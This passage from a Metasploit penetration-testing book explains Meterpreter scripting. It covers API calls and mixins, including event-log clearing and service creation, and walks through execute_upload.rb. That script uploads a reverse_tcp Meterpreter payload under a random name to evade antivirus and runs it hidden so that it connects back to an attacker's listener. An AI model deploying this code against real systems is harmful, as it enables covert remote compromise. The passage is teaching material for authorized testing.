class="s24">irb</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting IRB shell</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] The &#39;client&#39; variable holds the meterpreter client</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&gt;&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_654.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">After you are inside the interactive shell, you can use it to test the differ- ent API calls from Meterpreter.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark432">Printing Output</a><a name="bookmark442">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Let’s start with the <span class="s25">print_line() </span>call, which will print the output and add a carriage return at the end:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_655.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&gt;&gt; <span class="s24">print_line(&quot;you have been pwnd!&quot;)</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">you have been pwnd!</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=&gt; nil</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_656.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The next call is <span class="s25">print_status() </span>and is used most often in the scripting language. This call will provide a carriage return and print the status of what- ever is executing, with a <span class="s25">[*] </span>prefixed at the beginning:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_657.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&gt;&gt; <span class="s24">print_status(&quot;you have been pwnd!&quot;)</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] you have been pwnd!</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=&gt; nil</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_658.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The next call is <span class="s25">print_good()</span>, which is used to provide the results of an action or to indicate that the action was successful:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_659.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&gt;&gt; <span class="s24">print_good(&quot;you have been pwnd&quot;)</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[+] you have been pwnd</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=&gt; nil</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_660.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The next call is <span class="s25">print_error()</span>, which is used to provide an error message or to indicate that an action was not possible:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_661.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">&gt;&gt; <span class="s24">print_error(&quot;you have been pwnd!&quot;)</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[-] you have been pwnd!</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">=&gt; nil</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_662.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark433">Base API Calls</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">Meterpreter includes many API calls that you can use in your scripts to provide additional functionality or customization. You can use several reference points for these API calls. The one most often used by scripting newbies looks at how the Meterpreter console user interface (UI) uses the calls; these can be used as a base to continue writing scripts. To access this code, read the files under</p><p class="s19" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;">/opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/ <span class="p">in Back|Track. If you create a listing of the folder contents, you can see the files that contain various commands that you can use:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_663.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;line-height: 91%;text-align: left;">root@bt:~# <span class="s24">ls -F /opt/framework3/msf3/lib/rex/post/meterpreter/ui/console/ command_dispatcher/</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 87%;text-align: left;">core.rb espia.rb incognito.rb networkpug.rb priv/ priv.rb sniffer.rb stdapi/ stdapi.rb</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_664.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Within these scripts are the various Meterpreter core, desktop interaction, privileged operations, and many more commands. Review these scripts to become intimately familiar with how Meterpreter operates within a compro- mised system.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: justify;"><a name="bookmark434">Meterpreter Mixins</a><a name="bookmark443">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">The Meterpreter mixins are a series of calls that represent the most common tasks undertaken in a Meterpreter script. These calls are not available in <span class="s25">irb </span>and can be used only when creating a script for Meterpreter. Following is a list of some of the most notable calls:</p><p class="s24" style="padding-top: 8pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">cmd_exec(cmd) <span class="p">Executes the given command as hidden and channelized. The output of the command is provided as a multiline string.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">eventlog_clear(evt = &quot;&quot;) <span class="p">Clears a given event log or all event logs if none is given. Returns an array of event logs that were cleared.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">eventlog_list() <span class="p">Enumerates the event logs and returns an array contain- ing the names of the event logs.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">file_local_digestmd5(file2md5)     <span class="p">Returns a string with the MD5 checksum of a given local file.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">file_local_digestsha1(file2sha1) <span class="p">Returns a string with the SHA1 check- sum of a given local file.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">file_local_digestsha2(file2sha2) <span class="p">Returns a string with the SHA256 checksum of a given local file.</span></p><p class="s24" style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">file_local_write(file2wrt, data2wrt) <span class="p">Writes a given string to a specified file.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">is_admin?() <span class="p">Identifies whether or not the user is an admin. Returns </span><span class="s25">true</span></p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">if the user is an admin and <span class="s25">false </span>if not.</p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">is_uac_enabled?() <span class="p">Determines whether User Account Control (UAC) is enabled on the system.</span></p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">registry_createkey(key) </span>Creates a given registry key and returns <span class="s25">true </span>if successful.</p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">registry_deleteval(key,valname) </span>Deletes a registry value given the key and value name. Returns <span class="s25">true </span>if successful.</p><p style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">registry_delkey(key) </span>Deletes a given registry key and returns <span class="s25">true </span>if successful.</p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">registry_enumkeys(key) <span class="p">Enumerates the subkeys of a given registry key and returns an array of subkeys.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">registry_enumvals(key) <span class="p">Enumerates the values of a given registry key and returns an array of value names.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">registry_getvaldata(key,valname) <span class="p">Returns the data of a given registry key and its value.</span></p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">registry_getvalinfo(key,valname) <span class="p">Returns the data and type of a given registry key and its value.</span></p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">registry_setvaldata(key,valname,data,type) </span>Sets the data for a given value and type of data on the target registry. Returns <span class="s25">true </span>if successful.</p><p class="s24" style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: justify;">service_change_startup(name,mode) <span class="p">Changes a given service startup mode. The name and the mode must be provided. The mode is a string set with either a corresponding auto, manual, or disable setting. The service name is case sensitive.</span></p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">service_create(name, display_name, executable_on_host,startup=2)     </span>Function for the creation of a service that runs its own process. Its parameters are the service name as a string, the display name as a string, the path of the executable on the host that will execute at startup as a string, and the startup type as an integer: <span class="s25">2 </span>for Auto, <span class="s25">3 </span>for Manual, or <span class="s25">4 </span>for Disable (default is Auto).</p><p class="s24" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">service_delete(name) <span class="p">Function for deleting a service by deleting the key in the registry.</span></p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">service_info(name) </span>Gets Windows service information. The information is returned in a hash with display name, startup mode, and command executed by the service. The service name is case sensitive. Hash keys are <span class="s25">Name</span>, <span class="s25">Start</span>, <span class="s25">Command</span>, and <span class="s25">Credentials</span>.</p><p class="s24" style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">service_list() <span class="p">Lists all Windows services present. Returns an array con- taining the services’ names.</span></p><p style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">service_start(name) </span>Function for service startup. Returns <span class="s25">0 </span>if the service is started, <span class="s25">1 </span>if the service is already started, and <span class="s25">2 </span>if service is disabled.</p><p style="padding-top: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;"><span class="s24">service_stop(name) </span>Function for stopping a service. Returns <span class="s25">0 </span>if the service is stopped successfully, <span class="s25">1 </span>if the service is already stopped or disabled, and <span class="s25">2 </span>if the service cannot be stopped.</p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You should understand the basics regarding the Meterpreter mixin calls that you can use to add functionality to your custom script.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark435">Rules for Writing Meterpreter Scripts</a><a name="bookmark444">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When creating Meterpreter scripts, you need to understand the following rules before you begin your first script and if you want them to be committed to the Framework:</p><ul id="l39"><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Use only instance, local, and constant variables; never use global or class variables because they might interfere with the Framework variables.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Use hard tabs for indenting; do not use spaces.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">For code blocks, do not use <span class="s25">{}</span>. Instead, use <span class="s25">do </span>and <span class="s25">end</span>.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">When declaring functions, always write a comment before the declara- tion and provide a brief description of its purpose.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Do not use <span class="s25">sleep</span>; use <span class="s25">&quot;select(nil, nil, nil, &lt;time&gt;)&quot;</span>.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Do not use <span class="s25">puts </span>or any other standard output calls; instead use <span class="s25">print</span>, <span class="s25">print_line</span>, <span class="s25">print_status</span>, <span class="s25">print_error</span>, and <span class="s25">print_good</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Always include an <span class="s25">-h </span>option that will print a description and the purpose of the script and show the available options.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">If your script is meant for a specific operating system or Meterpreter plat- form, make sure it runs only on those platforms and prints out an error message for an unsupported OS or platform.</p></li></ul><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark436">Creating Your Own Meterpreter Script</a><a name="bookmark445">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Open up your favorite editor and create a new file called <span class="s19">execute_upload.rb</span>, located in <span class="s19">scripts/meterpreter/</span>. We’ll start by adding comments to the top of the file to let everyone know the purpose of this script and to define our options for the script:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_665.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># Meterpreter script for uploading and executing another meterpreter exe</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 193%;text-align: left;">info = &quot;Simple script for uploading and executing an additional meterpreter payload&quot; # Options</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">opts = Rex::Parser::Arguments.new(</p><p class="s30" style="padding-top: 1pt;padding-left: 93pt;text-indent: -23pt;line-height: 73%;text-align: left;">O<span class="s25">&quot;-h&quot; =&gt; [ false, &quot;This help menu. Spawn a meterpreter shell by uploading and executing.&quot;],</span></p><p class="s30" style="padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">8<span class="s25">&quot;-r&quot; =&gt; [ true, &quot;The IP of a remote Metasploit listening for the connect back&quot;],</span></p><p class="s30" style="padding-left: 93pt;text-indent: -23pt;line-height: 72%;text-align: left;">@<span class="s25">&quot;-p&quot; =&gt; [ true, &quot;The port on the remote host where Metasploit is listening (default: 4444)&quot;]</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">)</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_666.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;line-height: 92%;text-align: left;">This should look somewhat familiar, because it’s almost exactly the same as the example from Carlos Perez that appeared earlier in the chapter. The help message is defined with <span class="s25">-h </span>at <span class="s32">O</span>, and <span class="s25">-r </span>and <span class="s25">-p </span>are specified for the</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">remote IP address <span class="s32">8 </span>and port number <span class="s32">@ </span>we’ll need for our new Meterpreter</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">executable. Note that a <span class="s25">true </span>statement is included; this indicates that these</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">fields are required.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, we define the variables we want to use throughout the script. We’ll call the <span class="s25">Rex::Text.rand_text_alpha </span>function to create a unique executable name every time it’s called. This is efficient, because we don’t want to assign an executable name statically, which would “antivirus fingerprint” the attack. We’ll also configure each argument so that it either assigns a value or prints information with, for example, the <span class="s25">-h</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_667.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">filename= Rex::Text.rand_text_alpha((rand(8)+6)) + &quot;.exe&quot; rhost = Rex::Socket.source_address(&quot;1.2.3.4&quot;)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">rport = 4444</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">lhost = &quot;127.0.0.1&quot;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pay = nil</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"># Option parsing #</p><p class="s25" style="padding-left: 124pt;text-indent: -34pt;text-align: left;">opts.parse(args) do |opt, idx, val| case opt</p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 10pt;text-align: left;">when &quot;-h&quot;</p><p class="s25" style="padding-left: 158pt;text-indent: 0pt;text-align: left;">print_line(info) print_line(opts.usage) raise Rex::Script::Completed</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 124pt;text-indent: 0pt;line-height: 10pt;text-align: left;">when &quot;-r&quot;</p><p class="s25" style="padding-top: 1pt;padding-left: 124pt;text-indent: 34pt;line-height: 80%;text-align: left;">rhost = val<span class="s30">O </span>when &quot;-p&quot;</p><p class="s25" style="padding-left: 158pt;text-indent: 0pt;line-height: 13pt;text-align: left;">rport = val.to_i<span class="s30">8</span></p><p class="s25" style="padding-top: 7pt;padding-left: 124pt;text-indent: 0pt;text-align: left;">end</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_668.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 76%;text-align: left;">Notice that we broke out each argument and assigned values or print infor- mation back to the user. The <span class="s25">rhost = val </span><span class="s32">O </span>means “take the value presented from the user when <span class="s25">-r </span>was input.” The <span class="s25">rport = val.to_i </span><span class="s32">8 </span>simply assigns the</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">value as an integer (it will always need to be an integer for a port number).</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">In the next series, we define everything we need to create our payload:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_669.png"/></span></p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">payload = &quot;windows/meterpreter/reverse_tcp&quot;</span></p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">8 <span class="s25">pay = client.framework.payloads.create(payload) pay.datastore[&#39;LHOST&#39;] = rhost</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pay.datastore[&#39;LPORT&#39;] = rport</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">mul = client.framework.exploits.create(&quot;multi/handler&quot;) mul.share_datastore(pay.datastore) mul.datastore[&#39;WORKSPACE&#39;] = client.workspace</p><p class="s25" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">mul.datastore[&#39;PAYLOAD&#39;] = payload mul.datastore[&#39;EXITFUNC&#39;] = &#39;process&#39; mul.datastore[&#39;ExitOnSession&#39;] = true mul.exploit_simple(</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">&#39;Payload&#39; =&gt; mul.datastore[&#39;PAYLOAD&#39;], &#39;RunAsJob&#39; =&gt; true</p><p class="s25" style="padding-bottom: 3pt;padding-left: 94pt;text-indent: 0pt;line-height: 11pt;text-align: left;">)</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_670.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: left;">We define our payload as a <span class="s25">windows/meterpreter/reverse_tcp </span>at <span class="s32">O</span>, generate the payload calling the <span class="s25">client.framework.payloads.create(payload) </span>at <span class="s32">8</span>, and specify the necessary parameters to create the multi-handler. These are all</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">the required fields we need to set our payload using the <span class="s25">LHOST </span>and <span class="s25">LPORT </span>options and create a listener.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Next we create our executable (<span class="s19">win32pe meterpreter</span>), upload it to our target machine, and execute it:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_671.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;text-align: left;">O <span class="s25">if client.platform =~ /win32|win64/</span></p><p class="s30" style="padding-top: 7pt;padding-left: 70pt;text-indent: -8pt;line-height: 88%;text-align: left;">8<span class="s25">tempdir = client.fs.file.expand_path(&quot;%TEMP%&quot;) print_status(&quot;Uploading meterpreter to temp directory...&quot;) raw = pay.generate</span></p><p class="s30" style="padding-left: 70pt;text-indent: -8pt;line-height: 80%;text-align: left;">@<span class="s25">exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw) tempexe = tempdir + &quot;\\&quot; + filename</span></p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 11pt;text-align: left;">tempexe.gsub!(&quot;\\\\&quot;, &quot;\\&quot;)</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">fd = client.fs.file.new(tempexe, &quot;wb&quot;) fd.write(exe)</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;line-height: 10pt;text-align: left;">fd.close</p><p class="s25" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">print_status(&quot;Executing the payload on the system...&quot;) execute_payload = &quot;#{tempdir}\\#{filename}&quot;</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pid = session.sys.process.execute(execute_payload, nil, {&#39;Hidden&#39; =&gt; true})</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">end</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_672.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 18pt;text-align: left;"><span class="p">The variables called </span>#{<span class="s35">something</span>} <span class="p">have already been defined within the script and will be called later. Notice that we already defined </span>tempdir <span class="p">and </span>filename<span class="p">. Moving into the script, we first include an if statement to detect</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 74%;text-align: left;">whether the platform we are targeting is a Windows-based system <span class="s32">O</span>; otherwise, the attack won’t run. We then expand the temp directory <span class="s32">8 </span>on the target machine; this would be the equivalent of <span class="s19">%TEMP%</span>. Next we create a new</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">file on the system and write out the new <span class="s19">EXE </span>we just generated from the</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 15pt;text-align: left;">::Msf::Util::EXE.to_win32pe <span class="s32">@ </span><span class="p">call. Remember that we set the </span>session.sys</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">.process.execute <span class="p">to </span>Hidden <span class="p">so that the target user won’t see anything pop</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">up on his side.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Putting this all together, our final script should look something like this:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_673.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># Meterpreter script for uploading and executing another meterpreter exe</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 21pt;text-align: left;">info = &quot;Simple script for uploading and executing an additional meterpreter payload&quot; #</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;"># Options</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">#</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">opts = Rex::Parser::Arguments.new(</p><p class="s25" style="padding-left: 87pt;text-indent: -21pt;line-height: 88%;text-align: left;">&quot;-h&quot; =&gt; [ false, &quot;This help menu. Spawn a meterpreter shell by uploading and executing.&quot;],</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;text-align: left;">&quot;-r&quot; =&gt; [ true, &quot;The IP of a remote Metasploit listening for the connect back&quot;], &quot;-p&quot; =&gt; [ true, &quot;The port on the remote host where Metasploit is listening</p><p class="s25" style="padding-left: 87pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(default: 4444)&quot;]</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># Default parameters #</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">filename = Rex::Text.rand_text_alpha((rand(8)+6)) + &quot;.exe&quot; rhost = Rex::Socket.source_address(&quot;1.2.3.4&quot;)</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">rport = 4444</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">lhost = &quot;127.0.0.1&quot;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">pay = nil</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">#</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"># Option parsing #</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: -29pt;text-align: left;">opts.parse(args) do |opt, idx, val| case opt</p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 10pt;text-align: left;">when &quot;-h&quot;</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">print_line(info) print_line(opts.usage) raise Rex::Script::Completed</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 66pt;text-indent: 0pt;line-height: 11pt;text-align: left;">when &quot;-r&quot;</p><p class="s25" style="padding-left: 66pt;text-indent: 29pt;text-align: left;">rhost = val when &quot;-p&quot;</p><p class="s25" style="padding-left: 95pt;text-indent: 0pt;line-height: 11pt;text-align: left;">rport = 